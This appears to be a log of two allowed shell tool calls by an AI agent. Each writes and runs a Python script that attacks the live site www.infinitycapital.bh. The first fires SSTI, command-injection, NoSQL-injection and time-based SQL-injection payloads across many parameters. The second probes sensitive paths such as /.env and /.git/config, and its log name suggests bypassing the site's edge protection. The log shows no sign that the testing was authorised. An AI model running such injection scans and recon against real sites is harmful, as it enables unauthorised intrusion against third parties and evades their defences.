{"ts": 1790753650.7207298, "decision_id": "fa1ac2d1530f", "tool": "run_shell", "allow": true, "reason": null, "target": "cd /work && cat > inj_test.py <<'PY'\nimport requests, hashlib, time, json\nUA={'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome Safari','Accept':'*/*'}\nS=requests.Session(); S.headers.update(UA)\ndef norm(r):\n    h=r.content\n    h=h.replace(b'x-vercel-challenge-token',b'TOK')  # strip volatile\n    return len(h), hashlib.md5(h).hexdigest()[:10], r.status_code\ndef probe(name,url,**kw):\n    try:\n        r=S.get(url,timeout=20,allow_redirects=False,**kw)\n        print(f\"{name:34} {r.status_code} len={len(r.content)} md5={hashlib.md5(r.content).hexdigest()[:8]} mit={r.headers.get('x-vercel-mitigated','-')}\")\n    except Exception as e: print(f\"{name:34} EXC {e}\")\n# SSTI arithmetic markers\nfor p in ['q','id','page','search','x','cb','name','email','msg','url','w','zzz']:\n    probe(f\"GET ssti/{p}\", f\"https://www.infinitycapital.bh/?{p}={{{{7*7}}}}\")\n# CMDi\nfor p in ['q','id','page','search','x','cb','url','w']:\n    probe(f\"GET cmdi/{p}\", f\"https://www.infinitycapital.bh/?{p}=;id\")\n    probe(f\"GET cmdi2/{p}\", f\"https://www.infinitycapital.bh/?{p}=$(id)\")\n# NoSQL operators\nfor p in ['q','id','search','x','url']:\n    probe(f\"GET nosqli/{p}\", f\"https://www.infinitycapital.bh/?{p}[$ne]=1\")\n    probe(f\"GET nosqli2/{p}\", f\"https://www.infinitycapital.bh/?{p}[$gt]=\")\n# SQLi time-based\nimport time\nfor p in ['q','id','page','search','url','w']:\n    t0=time.time(); probe(f\"GET sqli-time/{p}\", f\"https://www.infinitycapital.bh/?{p}=1%20AND%20SLEEP(6)\"); print(\"   elapsed %.1f\"%(time.time()-t0))\nPY\npython3 inj_test.py 2>&1 | tee tool_outputs/inj_manual_differential.log | tail -50"}
{"ts": 1790753659.3533664, "decision_id": "682e440ba749", "tool": "run_shell", "allow": true, "reason": null, "target": "cd /work && cat > recon2.py <<'PY'\nimport requests, hashlib\nS=requests.Session(); S.headers.update({'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome Safari','Accept':'*/*'})\ndef p(name,url,**kw):\n    try:\n        r=S.get(url,timeout=20,allow_redirects=False,**kw)\n        ct=r.headers.get('content-type','-')\n        print(f\"{name:30} {r.status_code} len={len(r.content):7} md5={hashlib.md5(r.content).hexdigest()[:8]} ct={ct[:40]} mit={r.headers.get('x-vercel-mitigated','-')} loc={r.headers.get('location','-')}\")\n        return r\n    except Exception as e: print(f\"{name:30} EXC {e}\")\nfor path in ['/','/404','/404?q=test','/contact','/contact?x=1','/about','/team','/api/','/api/?id=1','/api/contact','/api/send','/atom.xml','/feeds/all.atom.xml','/sitemap.xml','/login','/admin','/portal','/.env','/.git/config','/next.config.js','/package.json','/api/newsletter','/api/apply','/privacy','/terms']:\n    p(\"GET \"+path,\"https://www.infinitycapital.bh\"+path)\nPY\npython3 recon2.py 2>&1 | tee tool_outputs/recon2_edgebypass.log"}
